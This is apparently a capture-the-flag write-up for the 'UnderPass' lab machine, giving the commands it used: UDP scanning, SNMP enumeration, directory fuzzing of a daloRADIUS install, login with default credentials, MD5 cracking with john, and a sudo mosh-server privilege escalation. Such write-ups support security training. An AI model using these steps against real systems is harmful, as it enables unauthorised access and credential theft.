# UnderPass

#### **UDP Scanning and Enumeration**

**Step 1: Scan for Open UDP Ports**

To identify open UDP ports on the target, we used the following commands:

```bash
bashCopierModifiersudo nmap -sU 10.10.11.48
rustscan -a 10.10.11.48 --ulimit 1000 -r 1-65535 -- -sU
```

**Step 2: SNMP Enumeration**

We utilized `snmpwalk` to gather information from the SNMP service:

```bash
bashCopierModifiersnmpwalk -v2c -c public 10.10.11.48
```

From the results, we discovered a reference to a **Daloradius database** running on the domain `underpass.htb`.

***

#### **Directory Fuzzing**

**Step 3: Fuzzing for Hidden Directories**

We performed directory fuzzing on the URL `underpass.htb/daloradius/FUZZ` to identify accessible endpoints. Tools like `wfuzz` or `gobuster` can be used for this purpose.

Additionally, to enumerate potential pages behind a 403 status code, we executed a targeted `dirsearch` scan:

```bash
bashCopierModifierdirsearch -t 50 -r -u "http://underpass.htb/daloradius"
```

Through fuzzing, we identified the page `underpass.htb/daloradius/users/login.php`.

**Step 4: Logging into Daloradius**

Using default credentials (commonly available for Daloradius installations), we successfully logged into the database interface.

***

#### **Hash Identification and Cracking**

**Step 5: Identifying the Hash**

The hash format was identified using `hashcat`:

```bash
bashCopierModifierhashcat --identify "412DD4759978ACFCC81DEAB01B382403"
```

The output revealed several potential formats, including:

* **MD4** (#900)
* **MD5** (#0)
* **md5(utf16le($pass))** (#70)
* **md5(md5($pass))** (#2600)

**Step 6: Cracking the Hash**

The hash was cracked using `john` with the raw MD5 format and the `rockyou.txt` wordlist:

```bash
bashCopierModifierjohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

***

#### **Connecting to a Mobile Shell**

**Step 7: Setting Up a MOSH Server**

To gain root access, we set up a **Mobile Shell (MOSH)** server locally:

```bash
bashCopierModifiersudo mosh-server
```

**Step 8: Connecting to the Server**

Using the provided key and port from the MOSH server, we connected to the shell:

```bash
bashCopierModifierMOSH_KEY='KK8E6Mjnz2P1NYGQmUEm6A' mosh-client 127.0.0.1 60001
```

***

#### **Conclusion**

Through systematic enumeration, directory fuzzing, and hash cracking, we gained access to the Daloradius interface and escalated privileges using a MOSH shell. These steps highlight the importance of thorough enumeration and the exploitation of default configurations in vulnerable applications.
